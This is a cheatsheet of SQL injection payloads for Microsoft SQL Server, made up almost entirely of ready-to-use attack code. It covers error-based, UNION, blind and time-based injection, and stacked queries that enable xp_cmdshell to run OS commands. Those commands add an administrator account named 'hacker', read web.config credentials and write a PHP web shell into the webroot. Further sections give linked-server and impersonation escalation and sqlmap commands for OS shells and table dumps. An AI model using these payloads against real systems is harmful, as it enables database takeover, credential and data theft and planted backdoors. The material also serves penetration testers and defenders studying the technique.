# Microsoft SQL Server (MSSQL) SQL Injection Cheatsheet

## Version & Info
```sql
SELECT @@version
SELECT @@servername
SELECT @@servicename
SELECT DB_NAME()
SELECT SYSTEM_USER
SELECT USER_NAME()
SELECT HOST_NAME()
SELECT IS_SRVROLEMEMBER('sysadmin')   -- 1 = yes, 0 = no
SELECT IS_SRVROLEMEMBER('serveradmin')
SELECT IS_ROLEMEMBER('db_owner')
```

## Database Enumeration
```sql
-- All databases
SELECT name FROM master..sysdatabases
SELECT name FROM sys.databases

-- Current database
SELECT DB_NAME()

-- Tables in current DB
SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE'
SELECT name FROM sysobjects WHERE xtype='U'

-- Tables in specific DB
SELECT name FROM target_db..sysobjects WHERE xtype='U'

-- Columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'
SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')
```

## User Enumeration
```sql
-- All logins
EXEC sp_helplogins
SELECT name,password_hash FROM sys.sql_logins

-- Current user roles
SELECT IS_SRVROLEMEMBER('sysadmin')       -- SA role
SELECT IS_SRVROLEMEMBER('serveradmin')    -- Server admin
SELECT IS_SRVROLEMEMBER('securityadmin')  -- Security admin
SELECT IS_ROLEMEMBER('db_owner')          -- DB owner

-- All server roles
EXEC sp_helpsrvrolemember 'sysadmin'
```

## Error-Based Payloads
```sql
-- CONVERT method (most reliable)
CONVERT(int, @@version)
CONVERT(int, DB_NAME())
CONVERT(int, USER_NAME())

-- In injection context
AND 1=CONVERT(int, @@version)
AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysdatabases))
AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))

-- CAST method
CAST(1/0 AS INT)
CAST(@@version AS INT)
```

## UNION-Based Payloads
```sql
-- Find column count
ORDER BY 1--
ORDER BY N-- (until error)

-- Extract data
UNION SELECT NULL,NULL,NULL--
UNION SELECT @@version,NULL,NULL--
UNION SELECT DB_NAME(),SYSTEM_USER,@@version--

-- List tables
UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
```

## Boolean Blind Payloads
```sql
-- True/False
AND 1=1--    (true)
AND 1=2--    (false)

-- Version check
AND SUBSTRING(@@version,1,1)='M'
AND ASCII(SUBSTRING(@@version,1,1))>77

-- DB name check
AND SUBSTRING(DB_NAME(),1,1)='m'
```

## Time-Based Payloads
```sql
-- WAITFOR DELAY
WAITFOR DELAY '0:0:5'
; WAITFOR DELAY '0:0:5'--
1; IF (1=1) WAITFOR DELAY '0:0:5'--

-- Conditional
IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'
IF (ASCII(SUBSTRING(DB_NAME(),1,1))>109) WAITFOR DELAY '0:0:5'
```

## Stacked Queries (Critical for MSSQL)
```sql
-- Test
; SELECT 1--

-- Enable xp_cmdshell
; EXEC sp_configure 'show advanced options',1--
; RECONFIGURE--
; EXEC sp_configure 'xp_cmdshell',1--
; RECONFIGURE--

-- Execute OS commands
; EXEC xp_cmdshell 'whoami'--
; EXEC xp_cmdshell 'net user hacker P@ss123 /add'--
; EXEC xp_cmdshell 'net localgroup administrators hacker /add'--

-- Read file
; SELECT * FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config',SINGLE_CLOB) AS t--

-- Write file via xp_cmdshell
; EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php'--
```

## Linked Server Attacks
```sql
-- Discover linked servers
SELECT * FROM sys.servers WHERE is_linked=1
EXEC sp_linkedservers

-- Enumerate linked server
EXEC ('SELECT @@version') AT [LINKED_SERVER]
EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [LINKED_SERVER]

-- Execute commands on linked server (if SA)
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER]
```

## Impersonation
```sql
-- Who can be impersonated?
SELECT b.name FROM sys.database_permissions a
JOIN sys.database_principals b ON a.grantor_principal_id=b.principal_id
WHERE a.permission_name='IMPERSONATE'

-- Impersonate SA
EXECUTE AS LOGIN='sa';
SELECT IS_SRVROLEMEMBER('sysadmin');
EXEC xp_cmdshell 'whoami';
REVERT;
```

## SQLMap Commands for MSSQL
```bash
# Basic detection
sqlmap -u "URL?id=1" --dbms=mssql --batch

# Full enumeration
sqlmap -u "URL?id=1" --dbms=mssql --current-user --current-db --is-dba --dbs --batch

# Check for sysadmin
sqlmap -u "URL?id=1" --dbms=mssql --sql-query="SELECT IS_SRVROLEMEMBER('sysadmin')" --batch

# OS shell (requires sysadmin)
sqlmap -u "URL?id=1" --dbms=mssql --os-shell --batch

# OS command
sqlmap -u "URL?id=1" --dbms=mssql --os-cmd="whoami" --batch

# Dump table
sqlmap -u "URL?id=1" --dbms=mssql -D webapp -T users --dump --batch
```
